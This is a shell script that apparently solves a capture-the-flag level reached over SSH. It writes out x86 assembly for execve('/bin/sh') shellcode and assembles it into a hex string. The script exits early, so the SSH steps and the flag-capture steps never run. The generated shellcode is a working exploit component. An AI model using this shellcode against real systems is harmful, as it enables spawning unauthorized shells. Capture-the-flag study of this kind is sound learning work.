#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)"

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# #### #
# MAIN #
# #### #

generate_exploit_shellcode() {
    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d);

	cat <<-'EOF' > "$tmpdir/exploit.asm"
		section .text
		    global _start
		_start:
		    ; 1. Store "/bin/sh\0" in the stack.
		    push 0x0068732f         ; Push "/sh\0"
		    push 0x6e69622f         ; Push "/bin"
		    ; 2. Setup execve::path parameter (EBX).
		    mov ebx, esp            ; Make EBX point to "/bin/sh\0".
		    ; 3. Setup execve::argv[] parameter (ECX).
		    xor ecx, ecx            ; ECX = 0 (argv = NULL)
		    ; 4. Setup execve::envp[] parameter (EDX).
		    xor edx, edx            ; EDX = 0 (envp = NULL)
		    ; 5. Execute sys_execve.
		    xor eax, eax            ; Clear EAX first (EAX = 0)
		    mov al, 0xb             ; EAX = 11
		    int 0x80                ; Trigger the syscall through interrupt table.
	EOF

    nasm -f elf32 "$tmpdir/exploit.asm" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\x" 1/1 "%02x"' "$tmpdir/shellcode.bin");
    echo "$shellcode";

    rm -rf "$tmpdir";
    unset tmpdir shellcode;
    return 0;
}

main() {
    host="${host:-localhost}";
    port="${port:-4242}";
    username="${username:-level2}";
    password="${password}";
    flag="";

    log "Authenticating to SSH server at $host:$port with username '$username' and password '$password'...";

    sys_execve_shellcode=$(generate_exploit_shellcode);
    echo "$sys_execve_shellcode";
    exit 0;

    ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; }
    ssh_exec_via_socket "$host" "$port" "$username" "echo 'Hello World!'";
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; }
    
    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    log "Flag '$flag' has been written to '$flag_path'";
    echo -n "$flag" > "$flag_path";
}

main "$@";
